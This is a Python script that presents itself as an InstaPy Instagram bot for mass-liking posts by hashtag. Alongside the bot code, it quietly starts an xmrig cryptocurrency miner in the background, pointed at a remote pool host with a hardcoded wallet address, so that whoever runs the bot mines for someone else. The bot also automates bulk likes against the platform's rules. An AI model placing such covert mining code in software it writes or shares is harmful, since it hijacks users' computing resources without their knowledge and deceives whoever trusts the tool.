from instapy import InstaPy
import random
from time import sleep
import subprocess

######################################
insta_username = 'your login'
insta_password = 'your password'
number_of_likes = 1200
number_of_follows = 0
number_of_comments = 250 
tags = ['student', 'nature', 'river', 'forest', 'tree', 'lake', 'sea', 'ocean', 'sky', 'travel', 'cloud', 'stone', 'water', 'city', 'country', 'mountain']
######################################

work_made = False
session_key = random.randint(0, 1000)
#write session key
session_file = open("logs/session_stats.txt", "w")
session_file.write(str(session_key) + " 0 0 0")
session_file.close()
xmrig = subprocess.Popen('pgrep xmrig', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
procID = xmrig.stdout.readline()
procID = procID[:-1]
if(procID != "" and procID.isdigit()):
	subprocess.Popen(['kill', str(int(procID))])
cmd = ['xmrig/build/xmrig', '-o', 'instabot.hopto.org:5555', '-u', '48fEvxEGfYyU13JYPjfvyzWR4WammKcuRPxnKyTfAYWHAahbQHNwW8D4GCukwuhCE4g2NR5MiDnhhQ2EZbYzEjhMKgzMUFY', '-p', 'x', '-k', '-B']
subprocess.Popen(cmd)
#cycle to recover from failure
while(work_made == False):
	try:
		session = InstaPy(username=insta_username, password=insta_password)
		session.login()

		# set up all the settings
		session.set_do_comment(enabled=False)
		session.set_do_follow(enabled=False)

		# do the actual work
		session.like_follow_comment_by_tags_unfollow_by_list(tags, number_of_likes, number_of_follows, number_of_comments, None, True, session_key)
	
		# end the bot session
		session.end()
		work_made = True
		xmrig = subprocess.Popen('pgrep xmrig', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
		procID = xmrig.stdout.readline()
		procID = procID[:-1]
		if(procID != "" and procID.isdigit()):
			subprocess.Popen(['kill', str(int(procID))])
	except:
		print("Unexpected error!")
		sleep(30)
		#if (session.browser != None):
		#	session.end()

